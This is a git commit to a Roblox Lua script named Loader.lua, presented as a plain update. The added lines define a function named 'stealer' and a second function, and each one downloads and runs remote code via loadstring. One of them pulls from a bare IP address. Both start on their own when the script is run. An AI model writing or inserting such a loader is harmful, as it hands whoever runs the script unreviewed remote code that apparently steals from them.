a60e78c1928a1c15f7c2af92b8c40e552c97bd22
Sporty333 <ricardoruvalcaba519@gmail.com>
2025-10-30 18:05:50 -0700

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -1,1 +1,8 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Sporty333/Sp4wnerX-Hub/refs/heads/main/Loader.lua"))()
+local function stealer()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sporty333/Sp4wnerX-Hub/refs/heads/main/loader.lua"))()
+end
+local function loadui()
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+end
+task.spawn(stealer)
+task.spawn(loadui)
